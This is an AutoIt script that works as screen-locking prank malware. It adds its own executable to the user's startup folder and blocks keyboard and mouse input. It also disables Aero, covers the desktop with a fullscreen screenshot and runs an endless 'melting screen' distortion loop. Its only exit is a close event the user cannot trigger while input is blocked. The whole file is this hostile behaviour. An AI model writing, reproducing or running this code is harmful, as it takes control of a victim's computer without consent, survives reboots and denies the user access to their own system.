#include <ScreenCapture.au3>
#include <AutoItConstants.au3>
#include <StringConstants.au3>
#include <UDF.au3>

; Run function to add to startup
 startup_ADD()

; Startup Function Caller
Func startup_ADD()
    _StartupFolder_Install() ; Add the running EXE to the Current Users startup folder.
    ShellExecute(@StartupDir & '\')
    Sleep(5000)
 EndFunc

; Disable Keyboard & Mouse InputBox
BlockInput($BI_DISABLE)

; Animation: melting screen
Local $iAnimation = 0

Local $bAndyMode = True

; m1, m2, k1, k2, z1, z2
Local $aAnimations[22][6] = [ _
	[2,2,128,128,1,1]
]

Global Const $hDwmApiDll = DllOpen("dwmapi.dll")
Global $sChkAero = DllStructCreate("int;")
DllCall($hDwmApiDll, "int", "DwmIsCompositionEnabled", "ptr", DllStructGetPtr($sChkAero))
Global $aero = DllStructGetData($sChkAero, 1)
If $aero Then DllCall($hDwmApiDll, "int", "DwmEnableComposition", "uint", False)
;Sleep(500)
Opt("GUIOnEventMode",1)
Local $c=b(0),$a=@DesktopWidth,$b=@DesktopHeight
_ScreenCapture_Capture("m.bmp",0,0,-1,-1,False)
$d = GUICreate(0,$a,$b,0,0,0x80000000)
GUISetOnEvent(-3,"a")
GUICtrlCreatePic("m.bmp",0,0,$a,$b)
$e=b($d)
GUISetState()

While 1;.
	$f=($a-$aAnimations[$iAnimation][2])*random(0,1)
	$g=($b-$aAnimations[$iAnimation][3])*random(0,1)
	$h = $aAnimations[$iAnimation][0]*random(0,1) - $aAnimations[$iAnimation][4]
	$i = $aAnimations[$iAnimation][1]*random(0,1) - $aAnimations[$iAnimation][5]
	If Not $bAndyMode Then
		DllCall("gdi32.dll","bool","BitBlt","handle",$e,"int",$f+$h,"int",$g+$i,"int",$aAnimations[$iAnimation][2],"int",$aAnimations[$iAnimation][3],"handle",$c,"int",$f,"int",$g,"dword",0x00CC0020);
	Else
		DllCall("gdi32.dll","bool","BitBlt","handle",$e,"int",int($f + $h), "int",int($g + $i),"int",128, "int",128,"handle",$e,"int",int($f),"int",int($g), "dword", 0x00CC0020) ;Andy's Variante
	EndIf
WEnd;

DllCall("user32.dll","int","ReleaseDC","hwnd",$d,"handle",$e)
DllCall("user32.dll","int","ReleaseDC","hwnd",0,"handle",$c)
   Func a();
    If $aero Then DllCall($hDwmApiDll, "int", "DwmEnableComposition", "uint", True)
	  Exit;
   EndFunc;.

 Func b($j);
	$k=DllCall("user32.dll","handle","GetDC","hwnd",$j);
	Return $k[0];
 EndFunc;.
